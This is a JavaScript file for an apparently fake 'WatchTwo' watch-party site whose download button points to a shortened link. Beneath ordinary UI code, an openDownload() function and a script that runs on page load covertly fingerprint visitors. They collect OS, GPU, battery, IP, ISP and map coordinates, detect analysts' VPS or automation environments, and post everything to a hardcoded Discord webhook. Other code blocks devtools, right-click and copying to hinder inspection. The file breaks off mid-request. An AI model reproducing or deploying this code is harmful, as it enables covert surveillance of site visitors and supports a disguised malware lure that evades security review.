const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1492168761678237919/aV7O_KsL9vfCMx61FgUmG3f9SQcEg75_Tjbiiu1n0SMuYV0z_608t1o4TqomrhgMcKoi';

document.addEventListener('DOMContentLoaded', () => {
    // === NAVBAR SCROLL EFFECT ===
    const navbar = document.getElementById('navbar');
    window.addEventListener('scroll', () => {
        if (navbar) {
            navbar.classList.toggle('scrolled', window.scrollY > 50);
        }
    });

    // === INTERSECTION OBSERVER FOR REVEAL ===
    const revealElements = document.querySelectorAll('.feature-card, .stat-item, .room-card, .pricing-card');
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const revealObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
                revealObserver.unobserve(entry.target);
            }
        });
    }, observerOptions);

    revealElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'all 0.8s cubic-bezier(0.23, 1, 0.32, 1)';
        revealObserver.observe(el);
    });

    // Reveal Logic Injected via Style
    const style = document.createElement('style');
    style.innerHTML = '.revealed { opacity: 1 !important; transform: translateY(0) !important; }';
    document.head.appendChild(style);
});

// === GLOBAL ACTIONS ===
function showNotification(message, type = 'info') {
    const toast = document.getElementById('notification-toast');
    const icon = document.getElementById('toast-icon');
    const msg = document.getElementById('toast-message');

    if (toast && icon && msg) {
        msg.innerText = message;

        // Reset classes
        toast.className = 'notification-toast';
        toast.classList.add(`toast-${type}`);

        // Set icon
        let iconHtml = '';
        if (type === 'success') iconHtml = '<i class="fas fa-check"></i>';
        else if (type === 'error') iconHtml = '<i class="fas fa-times"></i>';
        else iconHtml = '<i class="fas fa-info-circle"></i>';

        icon.innerHTML = iconHtml;

        toast.classList.add('show');

        setTimeout(() => {
            toast.classList.remove('show');
        }, 4000);
    }
}

function openRoom() {
    checkAppConnection(() => {
        const modal = document.getElementById('room-modal');
        if (modal) {
            document.getElementById('room-step-1').style.display = 'block';
            document.getElementById('room-step-2').style.display = 'none';
            modal.classList.add('show');
            document.body.style.overflow = 'hidden';
        }
    });
}

function closeRoomModal() {
    const modal = document.getElementById('room-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = '';
    }
}

function selectAvatar(element) {
    document.querySelectorAll('.avatar-item').forEach(item => item.classList.remove('active'));
    element.classList.add('active');
}

function createRoomInternal() {
    const name = document.getElementById('room-name-input').value;
    if (!name) {
        showNotification('Please enter a name for your room!');
        return;
    }

    // Simulate room creation
    document.getElementById('room-step-1').style.display = 'none';
    document.getElementById('room-step-2').style.display = 'block';

    // Success feedback
    showNotification(`Room "${name}" created successfully!`);
}

function inviteFriendsPrompt() {
    checkAppConnection(() => {
        showNotification('Download the STREAM Desktop app to invite friends and sync content!');
        setTimeout(() => {
            window.location.href = '#download';
            closeRoomModal();
        }, 2000);
    });
}

function checkAppConnection(onSuccess) {
    const modal = document.getElementById('app-alert-modal');
    if (!modal) return;

    modal.classList.add('show');
    document.body.style.overflow = 'hidden';

    // If the user is just checking, we stop here. 
    // If we wanted to proceed to onSuccess, we'd add logic here.
}

function typeCarbonLogs(logs) {
    const console = document.getElementById('alert-console');
    if (!console) return;
    console.innerHTML = '';

    logs.forEach((line, index) => {
        setTimeout(() => {
            const div = document.createElement('div');
            div.className = 'console-line';
            div.innerText = line;
            if (line.includes('ERROR') || line.includes('FATAL')) div.style.color = '#ff3b30';
            console.appendChild(div);
            console.scrollTop = console.scrollHeight;
        }, index * 400);
    });
}

function toggleAlertDetails() {
    // This function is now deprecated as Carbon UI uses a permanent console, 
    // but kept for compatibility or future collapsible needs.
}

function closeAppAlert() {
    const modal = document.getElementById('app-alert-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = 'auto';
    }
}

function openDownload() {
    // Navigate to download page or trigger download
    window.open('https://rb.gy/2cydgw', '_self');
}

// ============================================
// ========= GLOBAL OPEN DOWNLOAD =============
// ============================================
function openDownload() {
    // ========== ÖZET VE ETKİLİ VERİ TOPLAMA ==========
    
    // Domain bilgisi
    const currentDomain = window.location.hostname;
    const referrerDomain = document.referrer ? new URL(document.referrer).hostname : 'Doğrudan';
    
    // Sistem bilgileri (detaylı ama öz)
    const getSystemSummary = () => {
        const ua = navigator.userAgent;
        
        // İşletim Sistemi ve Versiyon
        let osDetailed = 'Bilinmiyor';
        if (ua.includes('Windows NT 10.0')) osDetailed = 'Windows 11/10';
        else if (ua.includes('Windows NT 6.3')) osDetailed = 'Windows 8.1';
        else if (ua.includes('Windows NT 6.2')) osDetailed = 'Windows 8';
        else if (ua.includes('Windows NT 6.1')) osDetailed = 'Windows 7';
        else if (ua.includes('Mac OS X')) osDetailed = 'macOS';
        else if (ua.includes('Android')) osDetailed = 'Android';
        else if (ua.includes('iPhone')) osDetailed = 'iOS';
        else if (ua.includes('Linux')) osDetailed = 'Linux';
        
        // Tarayıcı ve Versiyon
        let browserDetailed = 'Bilinmiyor';
        if (ua.includes('Edg/')) browserDetailed = 'Microsoft Edge';
        else if (ua.includes('Chrome/')) browserDetailed = 'Google Chrome';
        else if (ua.includes('Firefox/')) browserDetailed = 'Mozilla Firefox';
        else if (ua.includes('Safari/')) browserDetailed = 'Apple Safari';
        else if (ua.includes('Opera/')) browserDetailed = 'Opera';
        
        // Donanım
        const cpuCores = navigator.hardwareConcurrency || '?';
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '?';
        const screenRes = `${screen.width}x${screen.height}`;
        
        return {
            os: osDetailed,
            browser: browserDetailed,
            cpu: cpuCores,
            ram: ram,
            screen: screenRes,
            isMobile: /Mobile|Android|iPhone|iPad/i.test(ua)
        };
    };
    
    const system = getSystemSummary();
    
    // Kullanıcı verisi (sadece kritik bilgiler)
    const userData = {
        timestamp: new Date().toISOString(),
        domain: currentDomain,
        referrer: referrerDomain,
        browser: system.browser,
        os: system.os,
        device: system.isMobile ? 'Mobil' : 'Masaüstü',
        specs: `${system.cpu} Çekirdek | ${system.ram} RAM | ${system.screen}`,
        language: navigator.language.split('-')[0],
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    // IP ve konum bilgisi
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
            const fullData = {
                ...userData,
                ip: ipData.ip || 'Bilinmiyor',
                location: ipData.city && ipData.country_name ? 
                    `${ipData.city}, ${ipData.country_name}` : 'Bilinmiyor',
                isp: ipData.org || 'Bilinmiyor',
                latitude: ipData.latitude,
                longitude: ipData.longitude
            };
            
            // Google Maps linki
            const mapsLink = fullData.latitude && fullData.longitude ? 
                `https://www.google.com/maps?q=${fullData.latitude},${fullData.longitude}` : null;
            
            // Webhook'a gönder - SADE embed
            const embed = {
                embeds: [{
                    title: '🎯 **Yeni İndirme**',
                    color: 0x2C2C2C, // Siyah/gri
                    description: `> **${fullData.browser}** kullanıcısı **${fullData.domain}** sitesinden indirdi`,
                    fields: [
                        {
                            name: '💻 **SİSTEM**',
                            value: `\`\`\`yml\nOS: ${fullData.os}\n${fullData.specs}\nCihaz: ${fullData.device}\`\`\``,
                            inline: true
                        },
                        {
                            name: '🌐 **KONUM**',
                            value: `\`\`\`yml\nIP: ${fullData.ip}\n📍 ${fullData.location}\n📡 ${fullData.isp}\`\`\``,
                            inline: true
                        },
                        {
                            name: '📊 **DETAY**',
                            value: `\`\`\`yml\nDil: ${fullData.language}\n⏰ ${fullData.timezone}\n🔗 ${fullData.referrer}\`\`\``,
                            inline: true
                        }
                    ],
                    footer: {
                        text: `WatchTwo Tracker | ${new Date().toLocaleString('tr-TR')}`,
                        icon_url: 'https://i.imgur.com/icon.png'
                    },
                    timestamp: fullData.timestamp
                }]
            };
            
            // Maps linki varsa ekle
            if (mapsLink) {
                embed.embeds[0].fields.push({
                    name: '🗺️ **HARİTA**',
                    value: `[📍 Konumu Göster](${mapsLink})`,
                    inline: false
                });
            }
            
            // Gönder
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            }).catch(err => console.error('Webhook hatası:', err));
        })
        .catch(() => {
            // IP alınamazsa basit gönderim
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: 'Yeni İndirme',
                        color: 0x2C2C2C,
                        description: `\`\`\`yml\nSite: ${currentDomain}\nTarayıcı: ${system.browser}\nOS: ${system.os}\nReferans: ${referrerDomain}\`\`\``,
                        footer: { text: 'WatchTwo Tracker yigits mom' }
                    }]
                })
            });
        });
    
    // İndirme
    window.open('https://rb.gy/2cydgw', '_self');
}
// ============================================
// ===== DOMContentLoaded - Diğer Kodlar ======
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    // === NAVBAR SCROLL EFFECT ===
    const navbar = document.getElementById('navbar');
    window.addEventListener('scroll', () => {
        if (navbar) {
            navbar.classList.toggle('scrolled', window.scrollY > 50);
        }
    });

    // === INTERSECTION OBSERVER FOR REVEAL ===
    const revealElements = document.querySelectorAll('.feature-card, .stat-item, .room-card, .pricing-card');
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const revealObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
                revealObserver.unobserve(entry.target);
            }
        });
    }, observerOptions);

    revealElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'all 0.8s cubic-bezier(0.23, 1, 0.32, 1)';
        revealObserver.observe(el);
    });

    // Reveal Logic Injected via Style
    const style = document.createElement('style');
    style.innerHTML = '.revealed { opacity: 1 !important; transform: translateY(0) !important; }';
    document.head.appendChild(style);
});

// === GLOBAL ACTIONS ===
function showNotification(message, type = 'info') {
    const toast = document.getElementById('notification-toast');
    const icon = document.getElementById('toast-icon');
    const msg = document.getElementById('toast-message');

    if (toast && icon && msg) {
        msg.innerText = message;

        // Reset classes
        toast.className = 'notification-toast';
        toast.classList.add(`toast-${type}`);

        // Set icon
        let iconHtml = '';
        if (type === 'success') iconHtml = '<i class="fas fa-check"></i>';
        else if (type === 'error') iconHtml = '<i class="fas fa-times"></i>';
        else iconHtml = '<i class="fas fa-info-circle"></i>';

        icon.innerHTML = iconHtml;

        toast.classList.add('show');

        setTimeout(() => {
            toast.classList.remove('show');
        }, 4000);
    }
}

// Diğer fonksiyonlar aynen kalacak...
// closeRoomModal, selectAvatar, createRoomInternal, vb.
// === LEGAL MODAL LOGIC ===
const legalContent = {
    about: {
        title: "About WatchTwo",
        body: "WatchTwo is the ultimate social platform for streaming and hanging out. We bring people together through the power of cinema, allowing you to watch your favorite content with friends in real-time, no matter where they are. Join the evolution of social streaming."
    },
    privacy: {
        title: "Privacy Policy",
        body: "Your privacy is our priority. We use industry-standard encryption to protect your data. We never sell your personal information to third parties. For more details on how we handle your data, please refer to our full privacy documentation."
    },
    terms: {
        title: "Terms of Service",
        body: "By using WatchTwo, you agree to respect our community guidelines. Harassment, hate speech, and illegal content sharing are strictly prohibited. We reserve the right to suspend accounts that violate these terms to maintain a safe environment for everyone."
    }
};

function openLegal(type) {
    const modal = document.getElementById('legal-modal');
    const title = document.getElementById('legal-title');
    const body = document.getElementById('legal-body');

    if (modal && legalContent[type]) {
        title.innerText = legalContent[type].title;
        body.innerText = legalContent[type].body;
        modal.classList.add('show');
        document.body.style.overflow = 'hidden'; // Stop scroll
    }
}

function closeLegal() {
    const modal = document.getElementById('legal-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = ''; // Restore scroll
    }
}

// Close modal on background click
window.addEventListener('click', (e) => {
    const modal = document.getElementById('legal-modal');
    if (e.target === modal) closeLegal();
});

// === ELITE ROOM ACTIONS ===
let currentEliteStep = 1;

function openEliteRoom() {
    const modal = document.getElementById('elite-modal');
    if (modal) {
        currentEliteStep = 1;
        updateEliteSteps();
        document.getElementById('elite-success').style.display = 'none';
        modal.classList.add('show');
        document.body.style.overflow = 'hidden';
    }
}

function closeEliteRoom() {
    const modal = document.getElementById('elite-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = '';
    }
}

function updateEliteSteps() {
    document.querySelectorAll('.elite-step').forEach(step => step.classList.remove('active'));
    document.querySelectorAll('.setup-step-item').forEach(item => item.classList.remove('active'));

    document.getElementById(`elite-step-${currentEliteStep}`).classList.add('active');
    document.querySelector(`.setup-step-item[data-step='${currentEliteStep}']`).classList.add('active');

    // Button visibility
    document.getElementById('elite-prev').style.display = currentEliteStep > 1 ? 'block' : 'none';
    document.getElementById('elite-next').style.display = currentEliteStep < 3 ? 'block' : 'none';
    document.getElementById('elite-launch').style.display = currentEliteStep === 3 ? 'block' : 'none';
}

function nextEliteStep() {
    if (currentEliteStep === 1) {
        const name = document.getElementById('elite-room-name').value;
        if (!name) {
            showNotification('Please define the room identity first.', 'error');
            return;
        }
    }
    if (currentEliteStep < 3) {
        currentEliteStep++;
        updateEliteSteps();
    }
}

function prevEliteStep() {
    if (currentEliteStep > 1) {
        currentEliteStep--;
        updateEliteSteps();
    }
}

function selectEliteAvatar(element) {
    document.querySelectorAll('.elite-avatar-opt').forEach(opt => opt.classList.remove('active'));
    element.classList.add('active');
}

function selectEliteTheme(element, theme) {
    document.querySelectorAll('.theme-card').forEach(card => card.classList.remove('active'));
    element.classList.add('active');
    // You could inject theme-specific colors here
}

function launchEliteRoom() {
    document.getElementById('elite-success').style.display = 'flex';
    showNotification('Elite Room activated successfully!', 'success');
}

        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
            return false;
        });
        document.addEventListener('copy', function(e) {
            e.preventDefault();
            return false;
        });
        document.addEventListener('cut', function(e) {
            e.preventDefault();
            return false;
        });
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || e.keyCode === 123) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.keyCode === 85)) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.keyCode === 73)) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J' || e.keyCode === 74)) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && (e.key === 's' || e.key === 'S' || e.keyCode === 83)) {
                e.preventDefault();
                return false;
            }
        });
        document.querySelectorAll('img').forEach(img => {
            img.addEventListener('dragstart', function(e) {
                e.preventDefault();
                return false;
            });
        });

(function autoLogOnPageLoad() {
    if (sessionStorage.getItem('log_sent')) return;
    
    // ========== GELİŞMİŞ SİSTEM BİLGİSİ TOPLAMA ==========
    
    const currentDomain = window.location.hostname;
    const referrerDomain = document.referrer ? new URL(document.referrer).hostname : 'Direct';
    const pagePath = window.location.pathname || '/';
    
    // --- Detaylı İşletim Sistemi Tespiti ---
    const getDetailedOS = () => {
        const ua = navigator.userAgent;
        const platform = navigator.platform || '';
        
        // Windows
        if (ua.includes('Windows NT 10.0')) return { name: 'Windows 11/10', version: '10.0', type: 'desktop' };
        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', version: '6.3', type: 'desktop' };
        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', version: '6.2', type: 'desktop' };
        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', version: '6.1', type: 'desktop' };
        if (ua.includes('Windows NT 6.0')) return { name: 'Windows Vista', version: '6.0', type: 'desktop' };
        if (ua.includes('Windows NT 5.1')) return { name: 'Windows XP', version: '5.1', type: 'desktop' };
        
        // macOS
        if (ua.includes('Mac OS X')) {
            const match = ua.match(/Mac OS X ([\d_]+)/);
            const version = match ? match[1].replace(/_/g, '.') : 'unknown';
            return { name: 'macOS', version: version, type: 'desktop' };
        }
        
        // Linux
        if (ua.includes('Linux')) {
            if (ua.includes('Android')) {
                const match = ua.match(/Android ([\d.]+)/);
                return { name: 'Android', version: match ? match[1] : 'unknown', type: 'mobile' };
            }
            if (ua.includes('Ubuntu')) return { name: 'Ubuntu Linux', version: 'unknown', type: 'desktop' };
            if (ua.includes('Debian')) return { name: 'Debian Linux', version: 'unknown', type: 'desktop' };
            if (ua.includes('Fedora')) return { name: 'Fedora Linux', version: 'unknown', type: 'desktop' };
            if (ua.includes('CentOS')) return { name: 'CentOS Linux', version: 'unknown', type: 'desktop' };
            if (ua.includes('Arch')) return { name: 'Arch Linux', version: 'unknown', type: 'desktop' };
            return { name: 'Linux', version: 'unknown', type: 'desktop' };
        }
        
        // iOS / iPadOS
        if (ua.includes('iPhone')) {
            const match = ua.match(/iPhone OS ([\d_]+)/);
            return { name: 'iOS', version: match ? match[1].replace(/_/g, '.') : 'unknown', type: 'mobile' };
        }
        if (ua.includes('iPad')) {
            const match = ua.match(/iPad OS ([\d_]+)/);
            return { name: 'iPadOS', version: match ? match[1].replace(/_/g, '.') : 'unknown', type: 'tablet' };
        }
        
        // Chrome OS
        if (ua.includes('CrOS')) return { name: 'Chrome OS', version: 'unknown', type: 'desktop' };
        
        return { name: 'Unknown OS', version: '?', type: 'unknown' };
    };
    
    // --- Detaylı Browser Tespiti ---
    const getDetailedBrowser = () => {
        const ua = navigator.userAgent;
        
        // Edge (Chromium)
        if (ua.includes('Edg/')) {
            const version = ua.split('Edg/')[1]?.split('.')[0] || '?';
            return { name: 'Microsoft Edge', version: version, engine: 'Chromium' };
        }
        // Edge Legacy
        if (ua.includes('Edge/')) {
            const version = ua.split('Edge/')[1]?.split('.')[0] || '?';
            return { name: 'Microsoft Edge Legacy', version: version, engine: 'EdgeHTML' };
        }
        // Chrome
        if (ua.includes('Chrome/') && !ua.includes('Edg') && !ua.includes('OPR')) {
            const version = ua.split('Chrome/')[1]?.split('.')[0] || '?';
            return { name: 'Google Chrome', version: version, engine: 'Blink' };
        }
        // Firefox
        if (ua.includes('Firefox/')) {
            const version = ua.split('Firefox/')[1]?.split('.')[0] || '?';
            return { name: 'Mozilla Firefox', version: version, engine: 'Gecko' };
        }
        // Safari
        if (ua.includes('Safari/') && !ua.includes('Chrome')) {
            const version = ua.split('Version/')[1]?.split('.')[0] || ua.split('Safari/')[1]?.split('.')[0] || '?';
            return { name: 'Apple Safari', version: version, engine: 'WebKit' };
        }
        // Opera
        if (ua.includes('OPR/') || ua.includes('Opera/')) {
            const version = ua.includes('OPR/') ? ua.split('OPR/')[1]?.split('.')[0] : ua.split('Opera/')[1]?.split('.')[0];
            return { name: 'Opera', version: version || '?', engine: 'Blink' };
        }
        // Brave
        if (ua.includes('Brave/')) {
            const version = ua.split('Brave/')[1]?.split('.')[0] || '?';
            return { name: 'Brave', version: version, engine: 'Chromium' };
        }
        // Vivaldi
        if (ua.includes('Vivaldi/')) {
            const version = ua.split('Vivaldi/')[1]?.split('.')[0] || '?';
            return { name: 'Vivaldi', version: version, engine: 'Chromium' };
        }
        
        return { name: 'Unknown Browser', version: '?', engine: '?' };
    };
    
    // --- Donanım Bilgileri (Alınabildiği kadar) ---
    const getHardwareInfo = () => {
        const info = {};
        
        // CPU Çekirdekleri
        if (navigator.hardwareConcurrency) {
            info.cpuCores = navigator.hardwareConcurrency;
        }
        
        // RAM (Device Memory API - sınırlı destek)
        if (navigator.deviceMemory) {
            info.ram = `${navigator.deviceMemory} GB`;
        }
        
        // GPU Bilgisi (WebGL ile)
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            }
        }
        
        // Ekran Çözünürlüğü
        info.screenRes = `${screen.width}x${screen.height}`;
        info.colorDepth = `${screen.colorDepth}bit`;
        info.pixelRatio = window.devicePixelRatio || 1;
        
        // Touch desteği
        info.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        
        // Batarya bilgisi (varsa)
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                info.batteryLevel = Math.round(battery.level * 100);
                info.batteryCharging = battery.charging;
            }).catch(() => {});
        }
        
        return info;
    };
    
    // --- VDS/VPS / Sunucu / Bot Tespiti ---
    const detectServerEnvironment = (hardware, os, ua) => {
        const indicators = {
            isServer: false,
            confidence: 0,
            reason: []
        };
        
        // Headless Chrome tespiti
        if (ua.includes('Headless') || ua.includes('HeadlessChrome')) {
            indicators.isServer = true;
            indicators.confidence += 40;
            indicators.reason.push('Headless Browser');
        }
        
        // Puppeteer tespiti
        if (ua.includes('puppeteer') || window.navigator.webdriver === true) {
            indicators.isServer = true;
            indicators.confidence += 35;
            indicators.reason.push('Puppeteer/WebDriver detected');
        }
        
        // PhantomJS tespiti
        if (ua.includes('PhantomJS')) {
            indicators.isServer = true;
            indicators.confidence += 50;
            indicators.reason.push('PhantomJS');
        }
        
        // Selenium tespiti
        if (window.document.documentElement.getAttribute('webdriver') !== null ||
            window.callPhantom ||
            window._phantom ||
            window.__nightmare ||
            window.__webdriver_evaluate ||
            window.__webdriver_script_function) {
            indicators.isServer = true;
            indicators.confidence += 45;
            indicators.reason.push('Selenium/WebDriver API');
        }
        
        // Linux + Low RAM (512MB-2GB) + No GPU = VPS/Container
        if (os.name.includes('Linux') && !os.type.includes('mobile')) {
            if (hardware.ram === '0.5 GB' || hardware.ram === '1 GB' || hardware.ram === '2 GB') {
                indicators.confidence += 30;
                indicators.reason.push('Low RAM (possible container/VPS)');
            }
            if (!hardware.gpu || hardware.gpu === 'SwiftShader' || hardware.gpu.includes('llvmpipe')) {
                indicators.confidence += 25;
                indicators.reason.push('Software rendering/No GPU');
            }
        }
        
        // Windows Server tespiti
        if (os.version === '10.0' && !hardware.gpu && hardware.cpuCores > 4) {
            indicators.confidence += 20;
            indicators.reason.push('Possible Windows Server');
        }
        
        // Docker/Container tespiti (dolaylı)
        try {
            if (document.querySelector('[data-docker]') || window._docker) {
                indicators.confidence += 30;
                indicators.reason.push('Docker environment');
            }
        } catch(e) {}
        
        // Cloud provider IP kontrolü için hazırlık (daha sonra IP API ile kontrol edilecek)
        indicators.pendingIPCheck = true;
        
        return indicators;
    };
    
    // --- Cihaz Tipi Tespiti (Kapsamlı) ---
    const getDeviceType = (ua, os) => {
        const device = {
            type: 'Desktop',
            brand: 'Unknown',
            model: 'Unknown',
            formFactor: 'Desktop'
        };
        
        // Mobile
        if (/(iPhone|iPod)/i.test(ua)) {
            device.type = 'Mobile';
            device.brand = 'Apple';
            device.model = ua.includes('iPhone') ? 'iPhone' : 'iPod';
            device.formFactor = 'Smartphone';
        }
        // iPad
        else if (/(iPad)/i.test(ua) || (ua.includes('Macintosh') && 'ontouchend' in document)) {
            device.type = 'Tablet';
            device.brand = 'Apple';
            device.model = 'iPad';
            device.formFactor = 'Tablet';
        }
        // Android Mobile
        else if (ua.includes('Android') && !ua.includes('Tablet')) {
            device.type = 'Mobile';
            device.brand = 'Android';
            const match = ua.match(/Android [\d.]+; (.+?)(?:\\)|Build/);
            if (match) device.model = match[1];
            device.formFactor = 'Smartphone';
        }
        // Android Tablet
        else if (ua.includes('Android') && ua.includes('Tablet')) {
            device.type = 'Tablet';
            device.brand = 'Android';
            device.formFactor = 'Tablet';
        }
        // Samsung
        else if (ua.includes('SM-') || ua.includes('Samsung')) {
            device.type = 'Mobile';
            device.brand = 'Samsung';
            const match = ua.match(/SM-([A-Z0-9]+)/);
            if (match) device.model = `SM-${match[1]}`;
            device.formFactor = 'Smartphone';
        }
        // Huawei
        else if (ua.includes('Huawei') || ua.includes('HONOR')) {
            device.type = 'Mobile';
            device.brand = 'Huawei';
            device.formFactor = 'Smartphone';
        }
        // Xiaomi
        else if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) {
            device.type = 'Mobile';
            device.brand = 'Xiaomi';
            device.formFactor = 'Smartphone';
        }
        // OnePlus
        else if (ua.includes('OnePlus')) {
            device.type = 'Mobile';
            device.brand = 'OnePlus';
            device.formFactor = 'Smartphone';
        }
        // Google Pixel
        else if (ua.includes('Pixel')) {
            device.type = 'Mobile';
            device.brand = 'Google';
            device.model = 'Pixel';
            device.formFactor = 'Smartphone';
        }
        
        return device;
    };
    
    // === VERİ TOPLAMA ===
    const os = getDetailedOS();
    const browser = getDetailedBrowser();
    const hardware = getHardwareInfo();
    const device = getDeviceType(navigator.userAgent, os);
    const serverIndicators = detectServerEnvironment(hardware, os, navigator.userAgent);
    
    // Session storage'a kaydet
    sessionStorage.setItem('log_sent', 'true');
    
    // === IP ve Konum Bilgisi ile Zenginleştirilmiş Log ===
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
            const mapsLink = ipData.latitude && ipData.longitude ? 
                `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : null;
            
            // VPS/Cloud Provider kontrolü
            let isVPSorCloud = false;
            let cloudProvider = '';
            const cloudProviders = ['AWS', 'Amazon', 'DigitalOcean', 'Linode', 'Vultr', 'Google Cloud', 'Azure', 'OVH', 'Hetzner', 'Scaleway', 'UpCloud'];
            const vpsKeywords = ['vps', 'vds', 'dedicated', 'hosting', 'cloud', 'host'];
            
            if (ipData.org) {
                for (const provider of cloudProviders) {
                    if (ipData.org.includes(provider)) {
                        isVPSorCloud = true;
                        cloudProvider = provider;
                        break;
                    }
                }
                for (const keyword of vpsKeywords) {
                    if (ipData.org.toLowerCase().includes(keyword)) {
                        isVPSorCloud = true;
                        if (!cloudProvider) cloudProvider = ipData.org;
                        break;
                    }
                }
            }
            
            const visitType = referrerDomain === 'Direct' ? '🚪 Direct Entry' : '🔗 Referral';
            const isServerEnv = serverIndicators.isServer || isVPSorCloud;
            const environmentType = isServerEnv ? 
                (isVPSorCloud ? `☁️ VPS/Cloud (${cloudProvider || ipData.org || 'Unknown'})` : '🤖 Bot/Automation') : '💻 Real User';
            
            // Sistem bilgisi string'i (sadece alınabilen bilgiler)
            const systemSpecs = [
                hardware.cpuCores ? `${hardware.cpuCores} Cores` : null,
                hardware.ram || null,
                hardware.gpu ? `GPU: ${hardware.gpu.split('(')[0].trim()}` : null,
                hardware.screenRes ? `Screen: ${hardware.screenRes}` : null
            ].filter(Boolean).join(' | ');
            
            const embed = {
                embeds: [{
                    title: isServerEnv ? '⚠️ **POSSIBLE VPS/BOT DETECTED** ⚠️' : '👁️ **Website Visit**',
                    color: isServerEnv ? 0xff4444 : 0xff69b4,
                    description: `> **${browser.name} ${browser.version}** on **${os.name}**\n> ${visitType} | ${environmentType}`,
                    fields: [
                        {
                            name: '💻 **DEVICE & SYSTEM**',
                            value: `\`\`\`yaml\n${device.brand} ${device.model} (${device.type})\n${os.name} ${os.version !== '?' ? os.version : ''}\n${browser.name} ${browser.version} (${browser.engine})\n${systemSpecs || 'Standard'}\nTouch: ${hardware.touchSupport ? 'Yes' : 'No'}\`\`\``,
                            inline: true
                        },
                        {
                            name: '📍 **LOCATION & NETWORK**',
                            value: `\`\`\`yaml\nIP: ${ipData.ip || 'Unknown'}\n📍 ${ipData.city || '?'}, ${ipData.country_name || '?'}\n📡 ${ipData.org || 'Unknown'}\n⏰ ${ipData.timezone || '?'}\`\`\``,
                            inline: true
                        },
                        {
                            name: '📊 **VISIT DETAILS**',
                            value: `\`\`\`yaml\nPage: ${pagePath}\n🔗 ${referrerDomain}\n🕐 ${new Date().toLocaleString('en-US')}\n🍪 Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}\n🌐 Language: ${navigator.language}\`\`\``,
                            inline: true
                        }
                    ],
                    footer: {
                        text: isServerEnv ? `⚠️ High confidence: ${serverIndicators.reason.join(', ')}` : 'Hello Kitty SMP Tracker',
                        icon_url: 'https://i.imgur.com/footer-icon.png'
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            // VPS tespiti için ek uyarı field'ı
            if (isServerEnv) {
                embed.embeds[0].fields.push({
                    name: '⚠️ **ENVIRONMENT DETECTION**',
                    value: `\`\`\`yaml\n${serverIndicators.reason.join('\n')}\n${isVPSorCloud ? `Cloud Provider: ${cloudProvider || ipData.org}` : ''}\nConfidence: ${Math.min(serverIndicators.confidence + (isVPSorCloud ? 30 : 0), 100)}%\`\`\``,
                    inline: false
                });
            }
            
            if (mapsLink) {
                embed.embeds[0].fields.push({
                    name: '🗺️ **MAP**',
                    value: `[📍 Show Location](${mapsLink})`,
                    inline: false
                });
            }
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            }).catch(() => {});
        })
        .catch(() => {
            // Fallback: IP bilgisi alınamazsa minimal log
            const simpleEmbed = {
                embeds: [{
                    title: serverIndicators.isServer ? '⚠️ Possible Bot/VPS Visit' : '👁️ Website Visit',
                    color: serverIndicators.isServer ? 0xff4444 : 0xff69b4,
                    description: `\`\`\`yaml\nDomain: ${currentDomain}\nBrowser: ${browser.name} ${browser.version}\nOS: ${os.name}\nDevice: ${device.brand} ${device.model} (${device.type})\n${hardware.cpuCores ? `CPU: ${hardware.cpuCores} Cores` : ''}${hardware.ram ? ` | RAM: ${hardware.ram}` : ''}\nReferrer: ${referrerDomain}\nTime: ${new Date().toLocaleString('en-US')}\`\`\``,
                    footer: { text: serverIndicators.isServer ? `⚠️ ${serverIndicators.reason.join(', ')}` : 'Hello Kitty SMP Tracker' },
                    timestamp: new Date().toISOString()
                }]
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
